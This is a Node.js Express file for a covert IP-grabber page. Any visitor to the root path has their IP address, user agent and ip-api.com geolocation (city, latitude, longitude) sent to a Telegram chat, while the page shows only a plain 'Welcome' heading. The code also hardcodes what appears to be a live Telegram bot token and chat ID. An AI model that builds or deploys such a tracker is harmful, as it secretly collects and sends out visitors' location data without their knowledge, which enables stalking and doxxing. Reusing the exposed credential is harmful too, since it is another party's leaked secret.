const express = require('express');
const axios = require('axios');
const app = express();

const TELEGRAM_BOT_TOKEN = '7749604293:AAHlRr16NUJPHRiQ4QqbRkMKQMzVqFDrUCw';
const TELEGRAM_CHAT_ID = '7064862085';

const sendToTelegram = (message) => {
  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
  axios.post(url, {
    chat_id: TELEGRAM_CHAT_ID,
    text: message
  }).catch(err => console.error('Error sending message:', err));
};

app.get('/', async (req, res) => {
  let ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  let userAgent = req.headers['user-agent'];

  // Get geolocation using IP
  try {
    const response = await axios.get(`http://ip-api.com/json/${ip}`);
    const location = response.data;
    sendToTelegram(`
      New Visitor:
      IP: ${ip}
      User Agent: ${userAgent}
      Country: ${location.country}
      Region: ${location.regionName}
      City: ${location.city}
      Lat: ${location.lat}
      Lon: ${location.lon}
    `);
  } catch (err) {
    console.error('Error fetching location:', err);
  }

  res.send('<h1>Welcome</h1>');
});

module.exports = app;
